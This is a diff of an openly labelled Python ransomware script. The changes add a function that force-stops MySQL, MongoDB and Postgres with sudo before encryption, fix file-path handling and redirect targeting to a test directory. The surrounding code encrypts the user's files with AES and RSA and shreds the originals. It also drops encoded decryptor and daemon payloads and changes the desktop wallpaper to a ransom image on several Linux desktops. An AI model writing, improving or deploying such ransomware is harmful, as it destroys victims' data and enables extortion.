@@ -1,5 +1,3 @@
-#!/bin/bash/env python
-# coding=UTF-8
 import variables
 import asymmetric
 import get_files
@@ -19,6 +17,16 @@ from Crypto.Hash import MD5
 from Crypto.Hash import SHA
 from Crypto import Random
 from Crypto.Cipher import PKCS1_OAEP
+
+
+def kill_databases():
+    mysql = 'sudo mysqld stop; sudo mysql.server stop'
+    mongo = 'sudo service mongodb stop; sudo /etc/init.d/mongodb stop'
+    postgres = 'sudo pkill -u postgres; sudo pkill postgres'
+    
+    os.system(mysql)
+    os.system(mongo)
+    os.system(postgres)
 
 
 def encrypt_priv_key(msg, key):
@@ -72,7 +80,7 @@ def start_encryption(files):
         encrypted = AES_obj.encrypt(file_content)
         shred(found_file)
 
-        new_file_name = found_file + ".GNNCRY"
+        new_file_name = found_file.decode('utf-8') + ".GNNCRY"
         with open(new_file_name, 'wb') as f:
             f.write(encrypted)
 
@@ -88,14 +96,18 @@ def menu():
 
     # create ransomware directory 
     try:
-        os.mkdir(variables.ransomware_path, 700)
+        os.mkdir(variables.ransomware_path)
     except OSError:
         pass
+
+    # killing running database process
+    kill_databases()
         
     # get the files in the home directory
     # /home/$USER
-    files = get_files.find_files(variables.home)
-
+    files = get_files.find_files(variables.test)
+    for f in files:
+        print(f)
     # create RSA object
     rsa_object = asymmetric.assymetric()
     rsa_object.generate_keys()
@@ -106,12 +118,12 @@ def menu():
                                                     variables.server_public_key)
     
     # save encrypted client private key to disk
-    with open(os.path.join(variables.ransomware_path, '/encrypted_client_private_key.key'),
+    with open(os.path.join(variables.ransomware_path, 'encrypted_client_private_key.key'),
               'wb') as output:
         pickle.dump(encrypted_client_private_key, output, pickle.HIGHEST_PROTOCOL)
     
     # save client public key to disk
-    with open(os.path.join(variables.ransomware_path, "/client_public_key.PEM"),
+    with open(os.path.join(variables.ransomware_path, "client_public_key.PEM"),
               'wb') as f:
         f.write(Client_public_key)
     
@@ -144,7 +156,7 @@ def menu():
     gc.collect()
 
     # save to disk -> ENC(AES) BASE64(PATH)
-    with open(os.path.join(variables.ransomware_path, "/AES_encrypted_keys.txt"),
+    with open(os.path.join(variables.ransomware_path, "AES_encrypted_keys.txt"),
               'w') as f:
         for _ in enc_aes_key_and_base64_path:
             line = base64.b64encode(_[0]) + " " + _[1] + "\n"
@@ -157,11 +169,11 @@ def menu():
 
 def drop_daemon_and_decryptor():
     
-    with open(os.path.join(variables.ransomware_path, "/decryptor"),
+    with open(os.path.join(variables.ransomware_path, "decryptor"),
               'wb') as f:
         f.write(base64.b64decode(variables.decryptor))
 
-    with open(variables.ransomware_path + "/daemon", 'wb') as f:
+    with open(os.path.join(variables.ransomware_path, "daemon"), 'wb') as f:
         f.write(base64.b64decode(variables.daemon))
 
     os.chdir(variables.ransomware_path)
@@ -173,17 +185,17 @@ def drop_daemon_and_decryptor():
 
 
 def change_wallpaper():
-    with open(os.path.join(variables.ransomware_path, "/img.png"),
+    with open(os.path.join(variables.ransomware_path, "img.png"),
               'wb') as f:
         f.write(base64.b64decode(variables.img))
     gnome = 'gsettings set org.gnome.desktop.background picture-uri {}'\
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "img.png"))
     
     xfce = '''xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/workspace0/last-image -s "{}" ''' \
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "img.png"))
     
     xfce1 = 'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor1/workspace0/last-image -s "{}"' \
-            .format(variables.ransomware_path + "/img.png")
+            .format(os.path.join(variables.ransomware_path, "img.png"))
 
     kde = """dbus-send --session --dest=org.kde.plasmashell --type=method_call /PlasmaShell org.kde.PlasmaShell.evaluateScript 'string:
 var Desktops = desktops();                                                                                                                       
@@ -195,7 +207,7 @@ for (i=0;i<Desktops.length;i++) {
                                     "General");
         d.writeConfig("Image", "file://%s");
 }'
-""" %(variables.ransomware_path + "/img.png")
+""" %(os.path.join(variables.ransomware_path, "img.png"))
 
     os.system(gnome)
     os.system(xfce)
@@ -207,4 +219,3 @@ if __name__ == "__main__":
     menu()
     change_wallpaper()
     drop_daemon_and_decryptor()
-
